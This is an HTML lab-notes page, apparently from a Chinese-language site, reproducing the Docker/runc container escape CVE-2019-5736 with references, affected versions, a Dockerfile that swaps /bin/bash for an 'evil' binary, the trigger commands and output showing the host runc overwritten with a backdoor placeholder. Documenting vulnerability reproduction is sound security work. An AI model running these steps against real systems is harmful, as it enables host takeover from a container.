@@ -1,0 +1,71 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>CVE-2019-5736</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://github.com/q3k/cve-2019-5736-poc<br>
+https://www.cvedetails.com/cve/CVE-2019-5736/<br>
+https://github.com/twistlock/RunC-CVE-2019-5736<br>
+https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/<br>
+https://download.docker.com/linux/debian/dists/buster/pool/stable/amd64/containerd.io_1.2.0-1_amd64.deb<br>
+https://download.docker.com/linux/debian/dists/buster/pool/stable/amd64/docker-ce_18.09.0~3-0~debian-buster_amd64.deb<br>
+https://download.docker.com/linux/debian/dists/buster/pool/stable/amd64/docker-ce-cli_18.09.0~3-0~debian-buster_amd64.deb<br><br>
+
+<b>測試環境</b>：<br>
+Ubuntu 18.04 (4.15.0-20-generic)<br>
+Affected runc: 1.0.0-rc6<br>
+Affected Docker: &lt; 18.09.2<br><br>
+
+<b>測試步驟</b>：
+</p>
+<pre>
+# cd
+# git clone https://github.com/twistlock/RunC-CVE-2019-5736
+# cd RunC-CVE-2019-5736/exec_POC
+# vim Dockerfile
+    FROM ubuntu:18.04
+    COPY replace.sh /
+    RUN ["chmod", "+x", "/replace.sh"]
+    COPY overwrite_runc /overwrite_runc
+    RUN ["chmod", "+x", "/overwrite_runc"]
+    COPY new_runc /
+    RUN ["mv", "/bin/bash", "/bin/bash_original"]
+    COPY bash_evil /bin/bash
+    RUN ["chmod", "+x", "/bin/bash"]
+    ENTRYPOINT ["/bin/bash_original", "/replace.sh"]
+
+# docker build -t cve .
+# docker run --rm --name test cve
+    [+] Waiting for runC to be executed in the container...
+</pre><br>
+
+<p>
+ 開啟另一個視窗
+</p>
+<pre>
+# docker exec test bash
+    No help topic for '/bin/bash'
+</pre><br>
+
+<p>
+完成
+</p>
+<pre>
+# docker run --rm --name test cve
+    [+] Waiting for runC to be executed in the container...
+    [+] Got /proc/1071/exe as fd 3 in this process
+    [+] Opened runC (using /proc/self/fd/3) for writing
+    [+] Succesfully overwritten runC
+    [+] Done, shuting down ...
+
+# runc -v
+
+    **THE ALL NEW AND IMPROVED RUNC**
+
+        [+] Your backdoor here -&gt;
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
